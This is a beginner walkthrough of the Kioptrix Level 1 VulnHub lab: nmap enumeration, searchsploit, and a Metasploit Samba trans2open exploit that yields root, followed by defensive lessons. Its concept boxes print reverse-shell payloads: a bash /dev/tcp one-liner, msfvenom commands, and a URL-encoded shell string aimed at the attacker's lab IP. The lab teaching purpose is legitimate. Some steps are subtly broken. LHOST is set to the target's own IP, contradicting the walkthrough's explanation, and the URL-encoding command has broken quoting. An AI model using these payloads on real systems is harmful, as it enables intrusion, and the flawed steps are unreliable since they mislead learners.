# Kioptrix: Level 1 (#1) — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | Kioptrix: Level 1 (#1) |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | loneferret |
| **Released** | February 17, 2010 |
| **VulnHub Entry** | [Kioptrix: Level 1 (#1) on VulnHub](https://vulnhub.com/entry/kioptrix-level-1-1,22/) |
| **Download** | [Kioptrix: Level 1 OVA](https://vulnhub.com/entry/kioptrix-level-1-1,22/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Red Hat era) |

## 0. What you will learn

- **Network discovery:** How to locate a vulnerable VM on your local lab network.
- **Port & service enumeration:** How to use Nmap to identify open ports and extract service versions.
- **SMB vulnerability research:** Why an old Samba version is a common foothold for beginners.
- **Buffer overflow exploitation:** How the Samba `trans2open` remote buffer overflow works (conceptually) and how to leverage it with Metasploit.
- **Manual validation:** Using `searchsploit` to confirm available exploits before launching automated tools.
- **Post-exploitation basics:** Confirming privilege level, locating artifacts, and understanding the immediate root compromise.
- **Defensive thinking:** Practical blue team takeaways to prevent similar misconfigurations.

## 1. Reconnaissance — finding the target

Before attacking, we need to find the target's IP address on the virtual lab network. 

> **How to read it:** These commands help you discover live hosts on your isolated lab subnet. 
> **Why it works:** ARP and host discovery reveal which IP corresponds to your Kioptrix VM.

**Check your attacker IP:**
```bash
ip a
```

> **How to read it:** Shows your network interfaces and assigned IPs. Use the one for your lab network (e.g. `eth1`, `vmnet`, or `vboxnet`).
> **Example:** Your attacker (Kali) is typically `192.168.56.10`; the target will be a different address such as `192.168.56.101`.

**Discover live hosts on the subnet (ARP-based):**

Method A - `arp-scan` (common on Kali):

> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --localnet
```

Method B - `netdiscover`:
```bash
sudo netdiscover -i <lab-interface> -r 192.168.56.0/24
```

> **How to read it:** Look for the MAC vendor or hostname clues; Kioptrix VMs often show Linux-based MACs and will respond to ARP.

**Ping sweep (optional confirmation):**

> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sn 192.168.56.0/24
```

> **How to read it:** `-sn` skips port scanning and only checks for host reachability.
> **Why it works:** Confirms which IPs are up. For clarity, the rest of this guide uses the attacker `192.168.56.10` and the example target IP `192.168.56.101`. Replace these with the addresses you actually discover.


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services

With the target IP identified, we enumerate open ports, services, and versions. This is the most important step for beginners.

### 2.1 Full port scan
```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

> **How to read it:** `-p-` scans all 65535 TCP ports. `--min-rate 1000` speeds things up in lab environments. `-T4` is a timing template. `-oA` saves output in .nmap, .gnmap, and .xml formats.
> **Why it works:** Many vulnerable services run on non-standard ports in modern configs, but Kioptrix 1 exposes a predictable set.

### 2.2 Service detection & default scripts
```bash
sudo nmap -sC -sV -p 22,80,111,139,443,445,1024 -oA scans/services 192.168.56.101
```

> **How to read it:** `-sC` runs Nmap's safe default NSE scripts. `-sV` probes for service/version info. Specifying ports focuses the scan on discovered services.
> **Why it works:** Version numbers tell us if a service is outdated and likely exploitable.

### 2.3 Realistic expected output for Kioptrix 1

For the classic Kioptrix: Level 1 (#1), the scan typically returns something similar to this (exact banners can vary by build):

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at [DATE]
Nmap scan report for 192.168.56.101
Host is up (0.0005s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 2.2.1a (workgroup: MYGROUP)
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
445/tcp  open  netbios-ssn Samba smbd 2.2.1a (workgroup: MYGROUP)
1024/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: 3h59m59s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
```

> **How to read it:** The key lines are Samba 2.2.1a on ports 139 and 445, and Apache 1.3.20 with mod_ssl/2.8.4 and OpenSSL 0.9.6b on 80/443. SSH is OpenSSH 2.9p2.
> **Why it works:** SMB ports 139/445 expose Windows-like file sharing; Samba is the Linux implementation. The very old `Samba 2.2.1a` is vulnerable to the `trans2open` remote buffer overflow (CVE-2003-0201). The old mod_ssl/OpenSSL combo is also exploitable (CVE-2002-0082).

![nmap scan of Kioptrix](images/02-nmap.png)

## 3. Foothold — gaining the first shell

With enumeration complete, the shortest path to a shell is the Samba `trans2open` overflow. We'll cover both manual research and the Metasploit route.

### 3.1 Research with searchsploit

Always confirm the exploit exists offline first.


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit samba 2.2
searchsploit trans2open
```

> **How to read it:** `searchsploit` searches the local Exploit-DB archive. Look for `Samba 2.2.x - trans2open Overflow (Linux x86)` entries (e.g. `linux/remote/10.c`, `linux/remote/22.c`).
> **Why it works:** Matching the exact vulnerable version saves you from wasting time on incompatible exploits.

Example output (typical):
```text
Samba 2.2.x - trans2open Overflow (Linux x86)                | linux/remote/22.c
Samba trans2open Overflow (Linux x86)                         | linux/remote/10.c
```

> **Note:** While you can compile these standalone C exploits, the Metasploit module is clean and reliable in most lab environments.

### 3.2 Metasploit: use `exploit/linux/samba/trans2open`

Fire up msfconsole and run the classic exploit.


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
msfconsole -q
```

Inside msfconsole:

```text
msf6 > search trans2open
msf6 > use exploit/linux/samba/trans2open
msf6 exploit(linux/samba/trans2open) > show options
```

Configure the target and a suitable payload:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```text
msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.56.101
msf6 exploit(linux/samba/trans2open) > set LHOST 192.168.56.101
msf6 exploit(linux/samba/trans2open) > show payloads
msf6 exploit(linux/samba/trans2open) > set PAYLOAD linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > exploit
```

> **How to read it:** `RHOSTS` = target IP. `LHOST` = your attacker IP (where the reverse shell should connect back to). We choose `linux/x86/shell_reverse_tcp` here because it’s a simple non-staged shell payload that tends to work well on this legacy box.
> **Reverse_tcp vs bind payloads:** A reverse_tcp payload makes the target connect back to your attacker listener (common when firewalls/NAT block inbound). A bind_tcp payload would have the target listen on a port and you connect to it. For this local lab, either can work, but reverse is often safer.

### 3.3 Realistic expected output

If successful, you'll see something like:

```text
[*] Started reverse TCP handler on 192.168.56.101:4444
[*] Connecting to target...
[*] Trying return address 0xbffffdfc...
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.101:XXXX) at [DATE]
```

You should then drop into a shell. Verify identity:

```bash
whoami
id
uname -a
pwd
```

Realistic output:
```text
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
```

> **How to read it:** `uid=0(root)` means you have root privileges. On this VM, the Samba `trans2open` exploit yields **root directly** — no separate privilege escalation is required.
> **Why it works:** The vulnerable Samba process runs with high privileges on this intentionally misconfigured machine, so overflowing it executes your payload as that user (root).

![metasploit trans2open session](images/03-trans2open-shell.png)


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

**For this box, no further escalation is needed.** The `trans2open` exploit grants root immediately. 

- Run `id` to confirm: `uid=0(root) gid=0(root)`.
- Check for common flag files (varies by build): 
```bash
ls -la /root/
cat /root/README* 2>/dev/null; echo "---"
find / -name '*flag*' -type f 2>/dev/null | head -15
```

> **How to read it:** Some Kioptrix builds include a `congrats.txt` or flag in `/root/`, others do not. If nothing is present, that’s normal — the goal is to obtain a root shell. Do not invent flag contents.

### Alternative path (optional knowledge)

The web stack also has an older mod_ssl/OpenSSL vulnerability (CVE-2002-0082) sometimes referred to as "OpenFuck". Tools like `OpenFuck.c` can target specific Apache/mod_ssl/OpenSSL version pairs and potentially yield a shell. This is less common as the first path, but worth knowing:

- Target: Apache 1.3.20 + mod_ssl 2.8.4 + OpenSSL 0.9.6b
- Common approach: `searchsploit apache mod_ssl` → compile `OpenFuck.c` against the correct target code (e.g. `0x6b` for RedHat 7.2), run with target IP.
- Result varies; may drop to `apache` user and require further escalation on some builds. The Samba path is the canonical beginner route here.

> **Note:** Do not feel obligated to run OpenFuck if you already have root via trans2open.

![root confirmation and /root listing](images/04-root-escalation.png)

## 5. Summary of vulnerabilities

| Vulnerability | CVE | Affected Component | Port(s) | Impact | Notes |
|---|---|---|---|---|---|
| Samba `trans2open` buffer overflow | CVE-2003-0201 | Samba 2.2.0–2.2.8 (here 2.2.1a) | 139, 445 (SMB) | Remote Code Execution → root | Unauthenticated; classic Kioptrix 1 foothold. |
| mod_ssl/OpenSSL buffer overflow ("OpenFuck") | CVE-2002-0082 | Apache 1.3.20 + mod_ssl 2.8.4 + OpenSSL 0.9.6b | 80, 443 (HTTP/HTTPS) | Remote Code Execution | Alternative path; may require further escalation depending on build. |
| Weak/default SMB exposure | N/A (misconfiguration) | Legacy SMBv1 (netbios-ssn) | 139, 445 | Enables exploitation of old Samba | Avoid exposing SMB to untrusted networks. |
| Outdated SSH | N/A (old version) | OpenSSH 2.9p2 (protocol 1.99) | 22 | Potential legacy protocol/crypto concerns | Patch management issue. |

> **How to read it:** Multiple legacy services are present; the decisive issue is the unpatched Samba implementation reachable with no authentication.

## 6. Defensive lessons (blue team)

- **Patch management:** Update Samba, Apache, mod_ssl, OpenSSL, and OpenSSH to supported versions. The 2001–2003 era builds here are decades out of date.
- **Disable SMBv1:** SMBv1 is deprecated and highly vulnerable. Block TCP/445 and NetBIOS 139 at the perimeter; disable SMBv1 on modern systems.
- **Least exposure:** Do not expose file sharing (SMB) or management services to untrusted networks. Use host-based firewalls and network segmentation.
- **Remove unnecessary services:** If SMB is not needed, stop and disable `smbd/nmbd` (and related RPC services). If HTTP is internal-only, restrict access.
- **Harden legacy stacks:** If you must run legacy apps (rare), put them behind a VPN, WAF/proxy, and strict ACLs; ideally containerize or isolate.
- **Version awareness:** Inventory service versions in your environment and flag EOL software. Use vulnerability scanning (with care in production) to catch these issues.
- **Defense-in-depth:** Combine patching, network controls, logging/monitoring (SMB access logs), and alerting on suspicious outbound connections (useful if reverse shells occur).

## 7. References

These are real community writeups that document the same path and were consulted during research:

- [Kioptrix Level 1 Writeup — dearkepha/vulnhub.writeups (GitHub)](https://github.com/dearkepha/vulnhub.writeups/blob/main/kioptrixLevel1/Kioptrixlv1.md)
- [Vulnhub Kioptrix Level 1 — InnocentSADO (GitHub)](https://github.com/InnocentSADO/vulnhub-kioptrix-level1)
- [Kioptrix Level 1 Walkthrough — moehabx (GitHub)](https://github.com/moehabx/Kioptrix-Level-1-Writeup)
- [Kioptrix Level 1 — VulnQuest](https://vulnquest58.github.io/ctf/writeups/vulnhub/kioptrix)
- [Kioptrix Level 1 – Samba trans2open Exploit — Cyberdrek01 (GitHub)](https://github.com/Cyberdrek01/KIOPTRIX-LEVEL1-SAMBA-TRANS2OPEN)
- [VulnHub Official Entry — Kioptrix: Level 1 (#1)](https://vulnhub.com/entry/kioptrix-level-1-1,22/)

## 8. Screenshot checklist

- [ ] `images/01-recon-arp-scan.png` — ARP/host discovery showing target IP
- [ ] `images/02-nmap.png` — Nmap service/version scan showing ports 139/445 and Samba 2.2.1a
- [ ] `images/03-trans2open-shell.png` — Metasploit `trans2open` session opened
- [ ] `images/04-root-escalation.png` — `whoami`, `id`, and `/root` listing (confirming root)
- [ ] `images/05-proof.png` — Optional proof (flag/congrats if present)

> **How to read it:** Store screenshots in `labs/3-046-kioptrix-level-1-1/images/` and reference them here. Use relative paths as shown.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*